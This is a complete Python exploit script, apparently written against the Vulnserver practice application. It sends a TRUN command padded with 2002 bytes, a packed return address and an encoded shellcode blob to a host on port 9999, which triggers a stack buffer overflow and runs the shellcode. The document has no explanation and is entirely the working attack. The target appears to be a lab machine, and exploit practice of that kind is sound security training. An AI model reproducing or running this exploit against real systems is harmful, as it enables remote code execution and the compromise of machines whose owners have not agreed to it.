#!/usr/bin/python3

import socket
import struct
HOST = "192.168.1.102"
PORT = 9999

SHELL =  b""
SHELL += b"\xba\x31\x01\x01\xe6\xdb\xcb\xd9\x74\x24\xf4\x58"
SHELL += b"\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x61"
SHELL += b"\x0f\xe3\x13\x7d\xe7\x61\xdb\x7d\xf8\x05\x55\x98"
SHELL += b"\xc9\x05\x01\xe9\x7a\xb6\x41\xbf\x76\x3d\x07\x2b"
SHELL += b"\x0c\x33\x80\x5c\xa5\xfe\xf6\x53\x36\x52\xca\xf2"
SHELL += b"\xb4\xa9\x1f\xd4\x85\x61\x52\x15\xc1\x9c\x9f\x47"
SHELL += b"\x9a\xeb\x32\x77\xaf\xa6\x8e\xfc\xe3\x27\x97\xe1"
SHELL += b"\xb4\x46\xb6\xb4\xcf\x10\x18\x37\x03\x29\x11\x2f"
SHELL += b"\x40\x14\xeb\xc4\xb2\xe2\xea\x0c\x8b\x0b\x40\x71"
SHELL += b"\x23\xfe\x98\xb6\x84\xe1\xee\xce\xf6\x9c\xe8\x15"
SHELL += b"\x84\x7a\x7c\x8d\x2e\x08\x26\x69\xce\xdd\xb1\xfa"
SHELL += b"\xdc\xaa\xb6\xa4\xc0\x2d\x1a\xdf\xfd\xa6\x9d\x0f"
SHELL += b"\x74\xfc\xb9\x8b\xdc\xa6\xa0\x8a\xb8\x09\xdc\xcc"
SHELL += b"\x62\xf5\x78\x87\x8f\xe2\xf0\xca\xc7\xc7\x38\xf4"
SHELL += b"\x17\x40\x4a\x87\x25\xcf\xe0\x0f\x06\x98\x2e\xc8"
SHELL += b"\x69\xb3\x97\x46\x94\x3c\xe8\x4f\x53\x68\xb8\xe7"
SHELL += b"\x72\x11\x53\xf7\x7b\xc4\xf4\xa7\xd3\xb7\xb4\x17"
SHELL += b"\x94\x67\x5d\x7d\x1b\x57\x7d\x7e\xf1\xf0\x14\x85"
SHELL += b"\x92\x3e\x40\x84\x05\xd7\x93\x86\xcb\xbd\x1d\x60"
SHELL += b"\xa1\xd1\x4b\x3b\x5e\x4b\xd6\xb7\xff\x94\xcc\xb2"
SHELL += b"\xc0\x1f\xe3\x43\x8e\xd7\x8e\x57\x67\x18\xc5\x05"
SHELL += b"\x2e\x27\xf3\x21\xac\xba\x98\xb1\xbb\xa6\x36\xe6"
SHELL += b"\xec\x19\x4f\x62\x01\x03\xf9\x90\xd8\xd5\xc2\x10"
SHELL += b"\x07\x26\xcc\x99\xca\x12\xea\x89\x12\x9a\xb6\xfd"
SHELL += b"\xca\xcd\x60\xab\xac\xa7\xc2\x05\x67\x1b\x8d\xc1"
SHELL += b"\xfe\x57\x0e\x97\xfe\xbd\xf8\x77\x4e\x68\xbd\x88"
SHELL += b"\x7f\xfc\x49\xf1\x9d\x9c\xb6\x28\x26\xbc\x54\xf8"
SHELL += b"\x53\x55\xc1\x69\xde\x38\xf2\x44\x1d\x45\x71\x6c"
SHELL += b"\xde\xb2\x69\x05\xdb\xff\x2d\xf6\x91\x90\xdb\xf8"
SHELL += b"\x06\x90\xc9"


PAYLOAD = (
        b'TRUN /.../' +
        b'A' * 2002 +
        struct.pack('<L', 0x62501205) +
        b'C' * 32 +
    	SHELL 
)


with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
